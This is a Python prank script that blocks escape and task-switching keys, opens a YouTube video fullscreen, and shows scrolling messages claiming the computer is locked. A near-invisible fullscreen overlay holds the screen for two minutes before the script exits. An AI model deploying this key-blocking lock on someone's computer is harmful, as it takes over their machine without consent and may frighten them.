import webbrowser
import pyautogui
import tkinter as tk
import threading
import time
import keyboard
import os

def block_keys():
    blocked_keys = [
        "alt+tab",
        "alt+esc",
        "ctrl+esc",
        "ctrl+w",
        "alt+f4",
        "ctrl+shift+esc",
        "ctrl+alt+delete",
        "win",
        "tab",
        "esc",
        "ctrl+tab",
        "space",
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9",
        "0"
    ]

    for key in blocked_keys:
        keyboard.add_hotkey(key, lambda: None, suppress=True)

    keyboard.wait('end')

block_keys_thread = threading.Thread(target=block_keys)
block_keys_thread.start()

time.sleep(3)
url = "https://youtu.be/tdFjFGP4kPk?t=10"
webbrowser.open(url)

def automate_keys():
    time.sleep(3)
    pyautogui.press('f')
    time.sleep(1)
    for _ in range(5):
        pyautogui.press('up')

automation_thread = threading.Thread(target=automate_keys)
automation_thread.start()

time.sleep(4)
root = tk.Tk()
root.geometry("1200x100+{}+{}".format(root.winfo_screenwidth() - 1200, root.winfo_screenheight() - 150))
root.overrideredirect(True)
root.lift()
root.attributes('-topmost', True)
root.configure(bg="black")
label = tk.Label(root, text="", font=("Arial", 18, "bold"), bg="black", fg="green")
label.pack()


def update_label(label, root, text, delay, max_length):
    time.sleep(delay * 0.002)

    displayed_text = ''
    for char in text:
        displayed_text += char
        aligned_text = displayed_text.rstrip().rjust(max_length)
        label.config(text=aligned_text)
        root.update()
        time.sleep(0.08)

update_threads_args = [
    ("Well, this is a bit strange...", 10000),
    ("I bet you weren't expecting to watch Ace Ventura..", 18200),
    ("But now you gotta.", 25000),
    ("Because I've locked your computer.", 28500),
    ("You will not be able to close this window..", 34000),
    ("..or change windows or use escape keys...", 39000),
    ("So, might as well get your popcorn.", 44000),
    ("And enjoy the movie!", 47000),
    ("A loo...A serrrr..", 49000),
    (" ", 56000),
]

max_length = max([len(t[0]) for t in update_threads_args])
update_threads = [threading.Thread(target=update_label, args=(label, root, text, delay, max_length)) for text, delay in update_threads_args]
for thread in update_threads:
    thread.start()

def create_overlay():
    overlay = tk.Toplevel(root)
    overlay.overrideredirect(True)
    overlay.attributes('-topmost', True)
    overlay.geometry("{0}x{1}+0+0".format(root.winfo_screenwidth(), root.winfo_screenheight()))

    overlay.attributes("-alpha", 0.01)

    root.after(120000, lambda: (overlay.destroy(), root.destroy(), os._exit(0)))

    overlay.mainloop()

overlay_thread = threading.Thread(target=create_overlay)
overlay_thread.start()

root.mainloop()
